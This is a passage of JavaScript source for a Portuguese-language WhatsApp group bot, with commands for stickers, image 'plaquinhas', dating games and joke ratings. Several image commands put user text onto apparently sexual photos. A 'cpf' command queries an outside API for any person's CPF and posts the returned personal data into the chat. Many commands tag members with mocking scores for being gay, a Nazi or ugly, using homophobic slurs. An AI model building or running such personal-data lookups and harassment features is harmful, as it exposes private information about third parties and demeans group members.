reply(`Eai, ${pushname}, preparado(a)? Enviando agora verifique seu pv... ğŸ˜ˆğŸ”¥`)
break

case 'plaq1':
if(!isGroup)
if (args.length < 1) return reply('â•Ei humano, cadÃª o texto?')
if (q.length > 25) return reply('â—O texto Ã© longo, o mÃ¡ximo Ã© 25 caracteres.')
reagir(from, "ğŸ•’")
buffer = await getBuffer(`https://raptibef.sirv.com/images%20(1).jpeg?profile=Zanga%202.0&text.0.text=${q}`)
sendMsg = yoko.sendMessage(sender, {image: buffer}, {quoted: selo}),
reply(`Eai, ${pushname}, preparado(a)? Enviando agora verifique seu pv... ğŸ˜ˆğŸ”¥`)
break

case 'plaq2':
if(!isGroup)
if (args.length < 1) return reply('â•Ei humano, cadÃª o texto?')
if (q.length > 25) return reply('â—O texto Ã© longo, o mÃ¡ximo Ã© 25 caracteres.')
reagir(from, "ğŸ•’")
buffer = await getBuffer(`https://raptibef.sirv.com/images.jpeg?profile=Zanga%203.0&text.0.text=${q}&text.0.outline.blur=63`)
sendMsg = yoko.sendMessage(sender, {image: buffer}, {quoted: selo}),
reply(`Eai, ${pushname}, preparado(a)? Enviando agora verifique seu pv... ğŸ˜ˆğŸ”¥`)
break

case 'plaq3':
if(!isGroup)
if (args.length < 1) return reply('â•Ei humano, cadÃª o texto?')
if (q.length > 25) return reply('â—O texto Ã© longo, o mÃ¡ximo Ã© 25 caracteres.')
reagir(from, "ğŸ•’")
buffer = await getBuffer(`https://umethroo.sirv.com/Torcedora-da-sele%C3%A7%C3%A3o-brasileira-nua-mostrando-a-bunda-236x300.jpg?text.0.text=${q}&text.0.position.x=-64%25&text.0.position.y=-39%25&text.0.size=25&text.0.color=1b1a1a&text.0.font.family=Architects%20Daughter`) //api
plaq = ` *Plaquinha feita âœ“* `
sendMsg = yoko.sendMessage(sender, {image: buffer}, {quoted: selo}),
reply(`Eai, ${pushname}, preparado(a)? Enviando agora verifique seu pv... ğŸ˜ˆğŸ”¥`)
break

case 'plaq4':
if(!isGroup)
if (args.length < 1) return reply('â•Ei humano, cadÃª o texto?')
if (q.length > 25) return reply('â—O texto Ã© longo, o mÃ¡ximo Ã© 25 caracteres.')
reagir(from, "ğŸ•’")
buffer = await getBuffer(`https://umethroo.sirv.com/peito1.jpg?text.0.text=${q}&text.0.position.x=-4%25&text.0.position.y=-6%25&text.0.size=14&text.0.color=000000&text.0.font.family=Shadows%20Into%20Light&text.0.font.weight=700`)
sendMsg = yoko.sendMessage(sender, {image: buffer}, {quoted: selo}),
reply(`Eai, ${pushname}, preparado(a)? Enviando agora verifique seu pv... ğŸ˜ˆğŸ”¥`)
break

case 'plaq5':
if(!isGroup)
if (args.length < 1) return reply('â•Ei humano, cadÃª o texto?')
if (q.length > 25) return reply('â—O texto Ã© longo, o mÃ¡ximo Ã© 25 caracteres.')
buffer = await getBuffer(`https://lerrewor.sirv.com/Teste/images%20(1)%20(6).jpeg?text.0.text=${q}&text.0.position.x=-17%25&text.0.position.y=-20%25&text.0.size=41&text.0.color=000000&text.0.opacity=59&text.0.font.family=PT%20Mono&text.0.outline.blur=10" width="463" height="662" alt="" />`,`https://lerrewor.sirv.com/Teste/images%20(1)%20(12).jpeg?text.0.text=${q}&text.0.position.x=-20%25&text.0.position.y=-35%25&text.0.size=41&text.0.color=000000&text.0.font.family=Playball&text.0.background.opacity=16&text.0.outline.color=ff0000&text.0.outline.blur=24" width="225" height="225" alt="" />`)
sendMsg = yoko.sendMessage(sender, {image: buffer}, {quoted: selo}),
reply(`Eai, ${pushname}, preparado(a)? Enviando agora verifique seu pv... ğŸ˜ˆğŸ”¥`)
break

case 'plaq6':
if(!isGroup)
if (args.length < 1) return reply('â•Ei humano, cadÃª o texto?')
if (q.length > 25) return reply('â—O texto Ã© longo, o mÃ¡ximo Ã© 25 caracteres.')
buffer = await getBuffer(`https://lerrewor.sirv.com/Teste/images%20(1)%20(5).jpeg?text.0.text=${q}&text.0.position.x=-45%25&text.0.position.y=-29%25&text.0.size=36&text.0.color=000000&text.0.opacity=65&text.0.font.family=PT%20Sans%20Narrow" width="479" height="640" alt="" />`)
sendMsg = yoko.sendMessage(sender, {image: buffer}, {quoted: selo}),
reply(`Eai, ${pushname}, preparado(a)? Enviando agora verifique seu pv... ğŸ˜ˆğŸ”¥`)
break

case 'plaq7':
if(!isGroup)
if (args.length < 1) return reply('â•Ei humano, cadÃª o texto?')
if (q.length > 25) return reply('â—O texto Ã© longo, o mÃ¡ximo Ã© 25 caracteres.')
buffer = await getBuffer(`https://lerrewor.sirv.com/Teste/images%20(1)%20(10).jpeg?text.0.text=${q}&text.0.position.y=-25%25&text.0.size=41&text.0.color=000000&text.0.font.family=Vollkorn&text.0.background.opacity=100" width="193" height="261" alt="" />`)
sendMsg = yoko.sendMessage(sender, {image: buffer}, {quoted: selo}),
reply(`Eai, ${pushname}, preparado(a)? Enviando agora verifique seu pv... ğŸ˜ˆğŸ”¥`)
break

case 'plaq8':
if(!isGroup)
if (args.length < 1) return reply('â•Ei humano, cadÃª o texto?')
if (q.length > 25) return reply('â—O texto Ã© longo, o mÃ¡ximo Ã© 25 caracteres.')
buffer = await getBuffer(`https://lerrewor.sirv.com/Teste/images%20(1)%20(9).jpeg?text.0.text=${q}&text.0.position.x=-49%25&text.0.position.y=-19%25&text.0.size=45&text.0.color=000000&text.0.opacity=97&text.0.font.family=Patrick%20Hand" width="250" height="333" alt="" />`)
sendMsg = yoko.sendMessage(sender, {image: buffer}, {quoted: selo}),
reply(`Eai, ${pushname}, preparado(a)? Enviando agora verifique seu pv... ğŸ˜ˆğŸ”¥`)
break

case 'plaq9': 
if(!isGroup)
if (args.length < 1) return reply('â•Ei humano, cadÃª o texto?')
if (q.length > 25) return reply('â—O texto Ã© longo, o mÃ¡ximo Ã© 25 caracteres.')
buffer = await getBuffer(`https://lerrewor.sirv.com/Teste/images%20(1)%20(8).jpeg?text.0.text=${q}&text.0.position.x=-28%25&text.0.position.y=-41%25&text.0.size=41&text.0.color=000000&text.0.opacity=99&text.0.font.family=Signika" width="225" height="225" alt="" />`)
sendMsg = yoko.sendMessage(sender, {image: buffer}, {quoted: selo}),
reply(`Eai, ${pushname}, preparado(a)? Enviando agora verifique seu pv... ğŸ˜ˆğŸ”¥`)
break

// fim



case 'togif': 
if(!isQuotedSticker) return reply('Por favor, atribua uma figurinha animada Ã  mensagem para realizar a conversÃ£o para vÃ­deo/gif.');
try {
if((isMedia && !info.message.videoMessage || isQuotedSticker) && !q.length <= 1) {
const { FiguMp4OuGif } = require('./yoko/bunker//funcoes/togif.js');
getBufferWebP = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, "sticker");
fs.writeFileSync("./yoko/bunker/database/data/media/sticker/convert.webp", getBufferWebP);
outputFile = "./yoko/bunker/database/data/media/sticker/convert.webp";
convertWebP = await FiguMp4OuGif(outputFile);
await yoko.sendMessage(from, {video: {url: convertWebP}, gifPlayback: true, fileName: 'sticker-sb.gif'}, {quoted: selo}).catch(async(error) => {
    await reply(mess.error()); // Notificar ao usuÃ¡rio que ocorreu um erro ao enviar o resultado da conversÃ£o do WebP para MP4.
    await DLT_FL(outputFile); // Apagar o arquivo, caso ocorrer um erro na conversÃ£o entre eles.
    console.log(error)
});
}
} catch(error) {
    await reply(mess.error()); // Notificar ao usuÃ¡rio que ocorreu um erro ao realizar a conversÃ£o do WebP para MP4.
    console.log(error)
};
break


case "cpf":
try {
if (!q) return reply("estÃ¡ faltando o cpf");
let api = await fetchJson(`https://api.nexfuture.com.br/api/consultas/cpf?query=${encodeURIComponent(q)}`);

if (!api || !api.resultado) {
return reply("NÃ£o foi possÃ­vel obter os dados do CPF. Verifique o nÃºmero ou tente novamente mais tarde.");
}

let displayText = "";
if (Array.isArray(api.resultado)) {
if (api.resultado.length === 0) {
displayText = "Nenhum resultado encontrado para este CPF.";
} else {
api.resultado.forEach(item => {
for (const key in item) {
displayText += `${key}: ${item[key]}\n`;
}
displayText += "\n"; 
});
}
} else if (typeof api.resultado === 'object' && api.resultado !== null) {
for (const key in api.resultado) {
displayText += `${key}: ${api.resultado[key]}\n`;
}
} else if (typeof api.resultado === 'string') {
displayText = api.resultado;
} else {
displayText = "Formato de resultado desconhecido.";
console.log("Formato do resultado:", typeof api.resultado, api.resultado);
}

if (!displayText) {
displayText = "Nenhum dado encontrado para exibir.";
}

await yoko.relayMessage(from, {
interactiveMessage: {
header: proto.Message.InteractiveMessage.Header.create({
...(await prepareWAMessageMedia(
{ image: { url: "https://i.imgur.com/BpeJNEr.jpeg" } },
{ upload: yoko.waUploadToServer }
)),
hasMediaAttachment: false,
title: ``,
}),
body: { text: displayText },
footer: { text: "_by yoko bot_" },
nativeFlowMessage: {
buttons: [{
name: "cta_copy",
buttonParamsJson: `{"display_text":"Copiar","id":"copy_result","copy_code":"${displayText}"}`
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"consultas\",\"id\":\"!menuvip\"}"
}],
messageParamsJson: "",
},
},
},{});
} catch (error) {
console.error("Erro na consulta de CPF:", error);
reply("Ocorreu um erro ao consultar o CPF. Tente novamente mais tarde.");
}
break;


case 'chance':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))  
if(args.length < 1) return reply(`VocÃª precisa digitar da forma correta... Por exemplo: *${prefix}chance* _do jubileu ser gay_`)
await yoko.sendMessage(from, {text: `ğŸ˜µâ€ğŸ’«â™¦ï¸ - A chance _â€œ${q}â€_ Ã© de: *${Math.floor(Math.random() * 100)}%*. Eai, foi o que a probabilidade que esperava jovem?`, mentions: [sender]}, {quoted: selo});
break

case 'namorar': case 'pediremnamoro': 
if(!isGroup) return reply(mess.onlyGroup());
if(!menc_os2) return reply('Marque a mensagem ou o @ que queira pedir ela em namoro. Se vocÃª tomar um fora, juÃ­zo!');
if(botNumber.includes(menc_os2)) return reply("NÃ£o Ã© possÃ­vel pedir o bot em namoro, seu baitola. ğŸ™„");
if(JSON.stringify(namoro2).includes(menc_os2)) return reply(`Este usuÃ¡rio jÃ¡ foi pedido em namoro...`);
if(JSON.stringify(namoro1).includes(menc_os2) && namoro1[namoro1.map(i => i.usu1).indexOf(menc_os2)].namorados == false) return reply(`Essa pessoa jÃ¡ pediu alguÃ©m em namoro... Sinto muito! ğŸ˜•`);
if(JSON.stringify(namoro1).includes(menc_os2) && namoro1[namoro1.map(i => i.usu1).indexOf(menc_os2)].namorados == true) return reply(`NÃ£o serÃ¡ possÃ­vel pedir essa pessoa em namoro, pois a mesma jÃ¡ estÃ¡ com outro(a). ğŸŒš`);
if(JSON.stringify(namoro1).includes(sender) && namoro1[namoro1.map(i => i.usu1).indexOf(sender)].namorados == false) return await mention(`VocÃª jÃ¡ pediu para namorar com o (a) *@${namoro1[namoro1.map(i => i.usu1).indexOf(sender)].usu2}*. NÃ£o brinque com os sentimentos dos outros! Se decida logo ou digite: *${prefix}cancelarpedido*.`);
if(JSON.stringify(namoro1).includes(sender) && namoro1[namoro1.map(i => i.usu1).indexOf(sender)].namorados == true) return await mention(`VocÃª jÃ¡ estÃ¡ namorando com o (a) *@${namoro1[namoro1.map(i => i.usu1).indexOf(sender)].usu2}*...`);
await reagir(from, "ğŸ’")
namoro1.push({usu1: sender, usu2: menc_os2.split('@')[0], namorados: false, idgp: from, hora: hourofc, data: dattofc});
fs.writeFileSync("./yoko/bunker/database/func/namoro1.json", JSON.stringify(namoro1, null, 2));
namoro2.push({id: menc_os2, pedido: sender.split('@')[0], idgp: from});
fs.writeFileSync("./yoko/bunker/database/func/namoro2.json", JSON.stringify(namoro2));
await mention(`ğŸ¥³| FelicitaÃ§Ãµes *@${menc_os2.split('@')[0]}*!\nãª âƒâƒ”ÍœÌ¸Ì·Í“áªºO *@${sender.split('@')[0]}* acaba de pedir sua mÃ£o em namoro!\nãª âƒâƒ”ÍœÌ¸Ì·Í“áªºEai vocÃª aceita o pedido, *sim ou nÃ£o?*`);
break

case 'cancelarpedido':
if(!isGroup) return reply(mess.onlyGroup());
if(!JSON.stringify(namoro1).includes(sender)) return reply("NÃ£o hÃ¡ pedido de namoro para cancelar.");
if(namoro1[namoro1.map(i => i.usu1).indexOf(sender)].namorados == true) return reply("NÃ£o Ã© possÃ­vel cancelar o pedido de namoro depois de aceito.");
namoro1.splice(namoro1.map(i => i.usu1).indexOf(sender), 1);
fs.writeFileSync("./yoko/bunker/database/func/namoro1.json", JSON.stringify(namoro1, null, 2));
namoro2.splice(namoro2.map(i => i.id).indexOf(namoro1[namoro1.map(i => i.usu1).indexOf(sender)].usu2+"@s.whatsapp.net"), 1)
fs.writeFileSync("./yoko/bunker/database/func/namoro2.json", JSON.stringify(namoro2));
reply("âŒ| Pedido de namoro cancelado com sucesso.");
break

case 'terminar_namoro':
if(!JSON.stringify(namoro1).includes(sender)) return reply(`VocÃª nÃ£o estÃ¡ namorando com ninguÃ©m. Sinto muito!`)
D1 = namoro1.map(i => i.usu1).indexOf(sender)
D2 = namoro1.map(a => a.usu1).indexOf(`${namoro1[D1].usu2}@s.whatsapp.net`); 
namoro1[D2].namorados = false;
reply(`Agora vocÃª estÃ¡ totalmente solteiro, notifiquei a(o) sua/seu parceiro sobre o tÃ©rmino.`);
await yoko.sendMessage(`${namoro1[D1].usu2}@s.whatsapp.net`, {text: `Tenho uma notÃ­cia ruim sobre seu namoro, ele(a) acaba de terminar.\nâ€“\nâ€¢ Seja feliz e lembre dos todos os bons momentos que vocÃªs tiveram juntos.`}, {quoted: selo});
namoro1.splice(D2, 1);
fs.writeFileSync("./yoko/bunker/database/func/namoro1.json", JSON.stringify(namoro1, null, 2));
namoro1.splice(D1, 1);
fs.writeFileSync("./yoko/bunker/database/func/namoro1.json", JSON.stringify(namoro1, null, 2));
break

case 'minhadupla': case 'dupla':
if(!isGroup) return reply(mess.onlyGroup());
if(!JSON.stringify(namoro1).includes(sender)) return reply(`VocÃª nÃ£o estÃ¡ namorando com ninguÃ©m. Sinto muito!`);
await reagir(from, "â¤ï¸â€ğŸ©¹");
D1 = namoro1.map(i => i.usu1).indexOf(sender)
if(namoro1[D1].namorados == false) return reply(`A pessoa que vocÃª pediu em namoro nÃ£o aceitou o pedido ainda. Portanto, nÃ£o Ã© possÃ­vel consultar os dados da dupla.ï¸`);
await mention(`@${namoro1[D1].usu1.split('@')[0]} namora com @${namoro1[D1].usu2}\nâ€“\nâ€¢ O pedido de namoro ocorreu Ã s ${namoro1[D1].hora} do dia ${namoro1[D1].data}.\nâ€“\nâ€¢ Para realizar o tÃ©rmino do namoro Ã© fÃ¡cil, use o comando: *${prefix}terminar_namoro*`);
break

case 'nazista':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text: `Pesquisando a sua ficha de nazista: *@${sender_ou_n.split("@")[0]}* aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imgnazista}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa nazista?\nâ€¢ Porcentagem de chance de ser uma pessoa nazista: *${random}%.* `, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break 

case 'gay':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text: `Pesquisando a sua ficha de gay: @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
feio = random; boiola = random
if(boiola < 20 ) {var bo = 'hmm... vocÃª Ã© hetero...'} else if(boiola == 21 ) {var bo = '+/- boiola'} else if(boiola == 23 ) {var bo = '+/- boiola'} else if(boiola == 24 ) {var bo = '+/- boiola'} else if(boiola == 25 ) {var bo = '+/- boiola'} else if(boiola == 26 ) {var bo = '+/- boiola'} else if(boiola == 27 ) {var bo = '+/- boiola'} else if(boiola == 2 ) {var bo = '+/- boiola'} else if(boiola == 29 ) {var bo = '+/- boiola'} else if(boiola == 30 ) {var bo = '+/- boiola'} else if(boiola == 31 ) {var bo = 'tenho minha desconfianÃ§a...'} else if(boiola == 32 ) {var bo = 'tenho minha desconfianÃ§a...'} else if(boiola == 33 ) {var bo = 'tenho minha desconfianÃ§a...'} else if(boiola == 34 ) {var bo = 'tenho minha desconfianÃ§a...'} else if(boiola == 35 ) {var bo = 'tenho minha desconfianÃ§a...'} else if(boiola == 36 ) {var bo = 'tenho minha desconfianÃ§a...'} else if(boiola == 37 ) {var bo = 'tenho minha desconfianÃ§a...'} else if(boiola == 3 ) {var bo = 'tenho minha desconfianÃ§a...'} else if(boiola == 39 ) {var bo = 'tenho minha desconfianÃ§a...'} else if(boiola == 40 ) {var bo = 'tenho minha desconfianÃ§a...'} else if(boiola == 41 ) {var bo = 'vocÃª Ã© nÃ©?'} else if(boiola == 42 ) {var bo = 'vocÃª Ã© nÃ©?'} else if(boiola == 43 ) {var bo = 'vocÃª Ã© nÃ©?'} else if(boiola == 44 ) {var bo = 'vocÃª Ã© nÃ©?'} else if(boiola == 45 ) {var bo = 'vocÃª Ã© nÃ©?'} else if(boiola == 46 ) {var bo = 'vocÃª Ã© nÃ©?'} else if(boiola == 47 ) {var bo = 'vocÃª Ã© nÃ©?'} else if(boiola == 4 ) {var bo = 'vocÃª Ã© nÃ©?'} else if(boiola == 49 ) {var bo = 'vocÃª Ã© nÃ©?'} else if(boiola == 50 ) {var bo = 'vocÃª Ã© ou nÃ£o?'} else if(boiola > 51) {var bo = 'vocÃª Ã© gay...'
}
await yoko.sendMessage(from, {image: {url: imggay}, caption: `Qual Ã© a porcentagem de chance do(a) *@${sender_ou_n.split("@")[0]}* ser gay?\nâ€¢ *${random}% homossexual*, ${bo}`, mentions: [sender_ou_n], thumbnail:null}, {quoted: selo})
}, 7000)
break

case 'feio':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text: `Pesquisando a sua ficha de feio: *@${sender_ou_n.split("@")[0]}* aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
feio = random
if(feio < 20 ) {var bo = 'Ã‰ nÃ£o Ã© feio'} else if(feio == 21 ) {var bo = '+/- feio'} else if(feio == 23 ) {var bo = '+/- feio'} else if(feio == 24 ) {var bo = '+/- feio'} else if(feio == 25 ) {var bo = '+/- feio'} else if(feio == 26 ) {var bo = '+/- feio'} else if(feio == 27 ) {var bo = '+/- feio'} else if(feio == 2 ) {var bo = '+/- feio'} else if(feio == 29 ) {var bo = '+/- feio'} else if(feio == 30 ) {var bo = '+/- feio'} else if(feio == 31 ) {var bo = 'ainda tÃ¡ na mÃ©dia'} else if(feio == 32 ) {var bo = 'dÃ¡ pra pegar umas(ns) novinha(o) ainda'} else if(feio == 33 ) {var bo = 'Da pra pegar umas(ns) novinha(o) ainda'} else if(feio == 34 ) {var bo = 'Ã© fein, mas tem baum coraÃ§Ã£o'} else if(feio == 35 ) {var bo = 'tÃ¡ na mÃ©dia, mas nÃ£o deixa de ser feii'} else if(feio == 36 ) {var bo = 'bonitin mas Ã© feio com orgulho'} else if(feio == 37 ) {var bo = 'feio e preguiÃ§oso(a), vai se arrumar praga feia'} else if(feio == 3 ) {var bo = 'tenho '} else if(feio == 39 ) {var bo = 'feio, mas um banho e se arrumar, deve resolver'} else if(feio == 40 ) {var bo = 'fein,  mas nÃ£o existe gente feia, existe gente que nÃ£o conhece os produtos jequity'} else if(feio == 41 ) {var bo = 'vocÃª Ã© Feio, mas Ã© legal, continue assim'} else if(feio == 42 ) {var bo = 'Nada que uma maquiagem e se arrumar, que nÃ£o resolva.'} else if(feio == 43 ) {var bo = 'Feio que dÃ³i de ver, compra uma mÃ¡scara que melhora'} else if(feio == 44 ) {var bo = 'Feio mas nada que um saco na cabeÃ§a nÃ£o resolva nÃ©!?'} else if(feio == 45 ) {var bo = 'vocÃª Ã© feio, mas tem bom gosto'} else if(feio == 46 ) {var bo = 'feio mas tem muitos amigos'} else if(feio == 47 ) {var bo = 'Ã© feio mas tem lÃ¡bia pra pegar vÃ¡rias novinha'} else if(feio == 4 ) {var bo = 'feio e ainda nÃ£o sabe se vestir, vixi'} else if(feio == 49 ) {var bo = 'feiooo dms vey.'} else if(feio == 50 ) {var bo = 'vocÃª Ã© feio, mas nÃ£o se encherga.'} else if(feio > 51) {var bo = 'vocÃª Ã© feio demais bixo.'}
await yoko.sendMessage(from, {image: {url: imgfeio}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa feia?\nâ€¢ A porcentagem de chance Ã© *${random}%*, ${bo}`, mentions: [sender_ou_n], thumbnail:null}, {quoted: selo})
}, 7000)
break 

case 'corno':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a ficha de corno @${sender_ou_n.split("@")[0]}, aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imgcorno}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa chifruda?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break

case 'vesgo':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a ficha de vesgo @${sender_ou_n.split("@")[0]}, aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imgvesgo}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa vesga?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break 

case 'bebado':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a ficha de bebado(a) @${sender_ou_n.split("@")[0]}, aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imgbebado}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa bÃªbada?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break 

case 'gado':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a ficha de gado @${sender_ou_n.split("@")[0]}, aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imggado}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser um gado?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break 

case 'gostoso':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a sua ficha de gostoso @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imggostoso}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa gostosa?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, gifPlayback: true, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break 

case 'gostosa':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a sua ficha de gostosa @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imggostosa}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa gostosa?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, gifPlayback: true, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break 

case 'sigma':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a sua ficha de sigma @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imgsigma}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa sigma?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break

case 'beta':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a sua ficha de beta @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imgbeta}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser um beta?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break

case 'baiano':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a sua ficha de baiano @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imgbaiano}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa baiana?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break

case 'baiana':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a sua ficha de baiana @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imgbaiana}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa baiana?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break

case 'carioca':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a sua ficha de carioca @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imgcarioca}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa carioca?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break

case 'louco':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a sua ficha de louco @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imglouco}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa louca?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break

case 'louca':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a sua ficha de louca @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imglouca}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa louca?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break

case 'safada':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a sua ficha de safada @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
 setTimeout(async() => {
random = `${Math.floor(Math.random() * 110)}`
await yoko.sendMessage(from, {image: {url: imgsafada}, caption: `O quanto *@${sender_ou_n.split("@")[0]}* pode ser uma pessoa safada?\nâ€¢ A porcentagem de chance Ã© *${random}%*`, mentions: [sender_ou_n]}, {quoted: selo})
}, 7000)
break

case 'safado':
if(!isGroup) return reply(mess.onlyGroup())
if(!isModobn) return reply(mess.onlyGroupFun(prefix))
await yoko.sendMessage(from, {text:`Pesquisando a sua ficha de safado @${sender_ou_n.split("@")[0]} aguarde...`, mentions: [sender_ou_n]}, {quoted: selo})
 setTimeout(async() => {
